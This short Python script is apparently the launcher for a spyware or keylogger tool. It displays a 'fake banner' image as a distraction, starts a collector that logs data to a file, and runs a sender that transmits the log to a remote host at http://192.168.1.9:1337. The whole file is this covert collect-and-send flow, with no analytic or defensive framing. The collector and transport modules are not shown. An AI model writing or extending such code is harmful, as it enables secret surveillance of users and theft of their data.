import osutils
import collector
import transport
import misdirections 

logfile, imgpath = osutils.get_log_path(), osutils.get_img_path()

fake_banner = misdirections.FakeBanner(imagepath=imgpath)
fake_banner.show()

c = collector.Collector(logfile=logfile)
c.start()

sender = transport.Sender(remote="http://192.168.1.9:1337", logfile=logfile)
sender.start()

c.join()
sender.join()